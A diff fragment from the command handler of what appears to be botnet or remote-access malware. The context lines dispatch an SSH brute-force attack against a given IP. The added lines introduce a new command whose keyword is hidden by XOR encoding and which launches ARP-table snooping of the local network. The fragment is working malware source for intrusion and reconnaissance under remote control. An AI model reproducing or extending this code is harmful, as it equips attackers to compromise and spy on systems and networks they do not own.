@@ -179,6 +179,15 @@ def handle(sock):
 						p = threading.Thread(target=brute_force_ssh, args =(command[1],command[2],command[3])) #!bf_ssh <ip> <username> <timeout in seconds>
 						p.start()
 					attack+=1
+				 elif command[0] == xor_dec('QAAKCQgY',key):#encoded keyword: !snoop
+					if attack != 0:
+						stop = True
+						attack=0
+					stop = False
+					for _ in range(int(1)):
+						p = threading.Thread(target=arp_table_snoop)
+						p.start()
+					attack+=1
 				elif command[0] == '!cmd':
 					if attack != 0:
 						stop = True
